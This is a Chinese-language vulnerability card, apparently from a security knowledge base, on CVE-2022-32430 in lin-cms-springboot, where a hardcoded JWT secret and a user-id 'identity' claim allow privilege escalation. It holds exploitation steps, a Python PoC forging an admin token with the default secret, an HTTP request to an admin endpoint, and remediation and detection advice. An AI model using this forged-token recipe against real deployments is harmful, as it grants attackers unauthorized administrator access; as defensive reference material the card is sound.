---
id: web-generic-jwt-lin-cms-fixed-secret-identity-claim-privilege-escalation
title: lin-cms-springboot 固定 token-secret + identity 取数据库自增 id：把 identity 改成 1 自签 access token 直取管理员接口（CVE-2022-32430）
type: scenario
domain: web
path: web/generic/jwt
technique: jwt-fixed-secret-identity-claim-escalation
aliases:
- CVE-2022-32430
- lin-cms-springboot JWT 提权
- token-secret 硬编码
- identity 越权
- DoubleJWT generateTokens
tags:
- jwt
- hs256
- hardcoded-secret
- privilege-escalation
- identity-claim
- spring-boot
- cms
cve:
- CVE-2022-32430
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-W5
  verified_at: '2026-11-08T14:27:34+08:00'
  notes: 已对照原文核对：token-secret 固定值(x88Wf...*4)、identity=user.getId()/管理员=1、generateTokens 只含 type/scope/identity/exp、access 3600s/refresh 2592000s、10041 损坏与 10001 权限不足均与原文截图一致；未验证点：原文仅实测 identity=2 被拦与跨站复用，identity=1 自签取管理员接口属推论未逐条打点
---

## 一句话结论

lin-cms-springboot 把 JWT 的 `token-secret` 明文写在 `application.yml` 里，而访问控制完全依赖 token 里的 `identity` 字段——该字段就是登录用户的主键 id（管理员为 1）；攻击者拿到这个固定 secret 后自签一个 `identity=1`、`type=access`、`scope=lin` 的 HS256 token，即可直接调用所有 `/cms/admin/**` 管理接口（CVE-2022-32430）。

## 原理

- **secret 是硬编码配置**：`application.yml` 中 `token-secret: x88Wf...*4`，`DoubleJWT` 用它初始化 `JWTVerifier`/`Builder`；项目文档与仓库公开，因此"密钥保密"这一 JWT 安全前提直接失效。
- **`identity` 决定权限且等于用户 id**：`UserController.login()` 校验用户名/密码后 `return jwt.generateTokens(user.getId());`；`generateTokens(long identity)` 签发 `access`（`token-access-expire`，默认 3600s）与 `refresh`（`token-refresh-expire`，默认 2592000s），payload 只有 `type`、`scope`（固定 `lin`）、`identity`、`exp` 四个字段。拦截器/注解（`@AdminRequired`、`@LoginRequired`、`@PermissionModule`）按 `identity` 查库判断身份，因此 `identity=1` 等价于超级管理员。
- **为什么改 identity 就够**：服务端不校验"token 是否与服务器存储的会话一致"，只校验签名与格式；签名可用固定 secret 重算，格式补齐 `type/scope/exp` 后即为合法 token。原文用低权限账号拿到自身 token 后把 `identity` 改为 2 伪造低权身份测试（被"权限不足"拦截，说明该字段确实驱动授权判定），反向把 `identity` 改成 1 即得管理员。
- **过期时间同样有缺陷**：`exp` 由服务端生成但有效期长（refresh 一个月），且退出登录不吊销 token，拿到旧 token 在有效期内仍可用；这扩大了 secret 泄露后的利用窗口。
- **为什么这是"提权"而不是"越权"**：普通账号（`identity` 为非 1 的 id）本身就拥有合法 token，只要能把 `identity` 改成 1 就获得管理员身份，不需要猜管理员密码。

## 触发条件

- 目标为 lin-cms-springboot（`/cms/user/login` 返回 `access`/`refresh`），且 `application.yml` 的 `token-secret` 未改（默认值公开）。
- 攻击者能拿到该 secret（公开仓库、镜像、部署文档、源码泄露）。
- 已知管理员用户的数据库 id（常见为 1，或通过遍历/注册顺序推断）。
- 接口鉴权只依赖 token 内的 `identity` 与签名，不校验会话一致性/不吊销。

## 利用步骤

1. 指纹：请求 `POST /cms/user/login`，响应含 `access`/`refresh`；解码 access 得到 `type/scope/identity/exp` 四字段。
2. 取 secret：在源码/镜像/公开仓库中搜 `token-secret`、`application.yml`。
3. 用普通账号登录拿一个合法 token，确认 `identity` 是自己的用户 id。
4. 用 secret 重签：保持 `type=access`、`scope=lin`，把 `identity` 改成 1，`exp` 设为未来时间。
5. 携带伪造 token 访问管理接口（如 `GET /cms/admin/group/all`、`GET /cms/admin/user/...`），观察是否从 401/10001 变为业务成功。
6. 若被拒，核对 `scope`/`type` 字符串是否与真实 token 完全一致（大小写与拼接顺序都可能校验）。

## PoC

```python
import jwt, time

secret = "x88Wf0991079889x8796a0Ac68f9ecJJU17c5Vbe8beod7d8d3e695*4"  # application.yml 的 token-secret
payload = {
    "identity": 1,        # 管理员用户 id
    "scope": "lin",
    "type": "access",
    "exp": int(time.time()) + 3600,
}
print(jwt.encode(payload, secret, algorithm="HS256"))
```

```http
GET /cms/admin/group/all HTTP/1.1
Host: target
Authorization: Bearer <伪造的 access token>
Accept: application/json
```

成功时返回 200 与用户组列表；失败时返回 `{"code":10041,"message":"access token 损坏"}`（格式/签名不符）或 `{"code":10001,"message":"权限不足"}`（identity 权限不够）。

## 变体与关联

- 变体：把 `type` 改成 `refresh` 走刷新接口换取新 access，可绕过较短的 access 有效期。
- 变体：`identity` 换成其他存在的用户 id 做横向越权；若 id 自增且注册开放，可枚举批量试探。
- 关联：[[web-generic-jwt-example-config-hardcoded-secret]]（硬编码默认密钥的通用判定）、[[web-generic-jwt-lin-cms-shared-secret-cross-instance-token-reuse]]（同一 secret 导致的跨实例 token 复用，本卡的姊妹结论）、[[web-generic-jwt-unverified-signature-payload-tamper]]（不验签时的简化变体）。
- 边界：部署方改成随机 secret、增加会话一致性校验或吊销机制、或把权限判定改为查库比对 role 而非直接用 identity 时，该链失效。

## 检测与防御

- 修复：启动时检测 `token-secret` 是否为默认值并拒绝启动；secret 由密钥管理服务注入且每环境独立、定期轮换。
- 修复：不要用自增主键作为授权依据；在 token 中放不可枚举的 subject，权限在服务端按角色查库判定，并校验 token 与当前会话/版本号一致。
- 加固：缩短 access 有效期并实现 refresh 轮换与吊销（退出登录使 token 失效）；对管理接口做二次校验（IP/设备/角色）。
- 检测：JWT payload 中 `identity` 与登录用户不匹配、短时间同一 secret 下大量不同 identity 的 token、管理接口被非常用账号访问；配置扫描发现 `token-secret` 为默认值。
